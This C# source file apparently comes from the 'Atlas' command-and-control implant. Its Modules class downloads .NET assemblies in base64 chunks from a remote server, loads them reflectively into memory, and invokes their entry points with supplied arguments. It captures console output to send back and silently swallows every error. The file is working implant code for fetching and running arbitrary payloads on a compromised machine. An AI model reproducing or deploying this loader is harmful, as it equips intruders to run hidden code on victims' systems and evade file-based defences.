using System;
using System.Text;
using System.Reflection;
using System.IO;
using System.Collections.Generic;
using System.Linq;

namespace Atlas
{
    class Modules
    {
        public static bool Check(string FileId)
        {
            try
            {
                bool a = Config.Modules.ContainsKey(FileId);
                return a;
            }
            catch
            {
                return false;
            }
        }

        public static string GetFullName(string FileId)
        {
            try
            {
                if (Check(FileId))
                {
                    string FullName = Config.Modules[FileId];
                    return FullName;
                }
                else
                {
                    return "";
                }
            }
            catch
            {
                return "";
            }
        }

        public static string ListAssemblies()
        {
            string AssemblyList = "";
            try
            {
                foreach (KeyValuePair<string, string> Entry in Config.Modules)
                {
                    string Module = Encoding.UTF8.GetString(Convert.FromBase64String(Entry.Value));
                    string[] Assembly = Module.Split(',');
                    AssemblyList += Assembly[0] + '\n';
                }
                return AssemblyList;
            }
            catch
            {
                return AssemblyList = "";
            }
        }

        public static bool Load(string FileId,string B64Assembly)
        {
            try
            {
                if (Check(FileId))
                {
                    return false;
                }
                else
                {
                    var a = Assembly.Load(Convert.FromBase64String(B64Assembly));
                    string fullname = Convert.ToBase64String(Encoding.UTF8.GetBytes(a.FullName));
                    Config.Modules.Add(FileId, fullname);
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        public static string Invoke(string FileId, string[] args)
        {
            string output = "";
            try
            {
                string FullName = GetFullName(FileId);
                Assembly[] assems = AppDomain.CurrentDomain.GetAssemblies();
                foreach (Assembly assem in assems)
                {
                    if (assem.FullName == Encoding.UTF8.GetString(Convert.FromBase64String(FullName)))
                    {
                        MethodInfo entrypoint = assem.EntryPoint;
                        object[] arg = new object[] { args };

                        TextWriter realStdOut = Console.Out;
                        TextWriter realStdErr = Console.Error;
                        TextWriter stdOutWriter = new StringWriter();
                        TextWriter stdErrWriter = new StringWriter();
                        Console.SetOut(stdOutWriter);
                        Console.SetError(stdErrWriter);

                        entrypoint.Invoke(null, arg);

                        Console.Out.Flush();
                        Console.Error.Flush();
                        Console.SetOut(realStdOut);
                        Console.SetError(realStdErr);

                        output = stdOutWriter.ToString();
                        output += stdErrWriter.ToString();
                        break;
                    }
                }
                return output;
            }
            catch
            {
                return output;
            }
        }

        public static byte[] GetAssembly(string FileId)
        {
            byte[] FinalAssembly = new byte[] { };
            try
            {
                int total_chunks = 2;
                int chunk_num = 1;
                Utils.Upload Upload = new Utils.Upload
                {
                    action = "upload",
                    chunk_size = 512000,
                    file_id = FileId,
                    chunk_num = chunk_num,
                };
                Utils.UploadResponse UploadResponse = Http.GetUpload(Upload);
                total_chunks = UploadResponse.total_chunks;
                byte[][] AssemblyArray = new byte[total_chunks][];
                AssemblyArray[chunk_num - 1] = Convert.FromBase64String(UploadResponse.chunk_data);
                while (chunk_num != total_chunks)
                {
                    Utils.Upload ChunkUpload = new Utils.Upload
                    {
                        action = "upload",
                        chunk_size = 512000,
                        chunk_num = chunk_num,
                        file_id = Upload.file_id
                    };
                    Utils.UploadResponse ChunkUploadResponse = Http.GetUpload(ChunkUpload);
                    if (ChunkUploadResponse.chunk_num == chunk_num)
                    {
                        AssemblyArray[chunk_num - 1] = Convert.FromBase64String(ChunkUploadResponse.chunk_data);
                        chunk_num++;
                    }
                }
                FinalAssembly = Combine(AssemblyArray);
                return FinalAssembly;
            }
            catch
            {
                return FinalAssembly;
            }
        }

        public static byte[] Combine(params byte[][] arrays)
        {
            byte[] rv = new byte[arrays.Sum(a => a.Length)];
            int offset = 0;
            foreach (byte[] array in arrays)
            {
                System.Buffer.BlockCopy(array, 0, rv, offset, array.Length);
                offset += array.Length;
            }
            return rv;
        }
    }
}
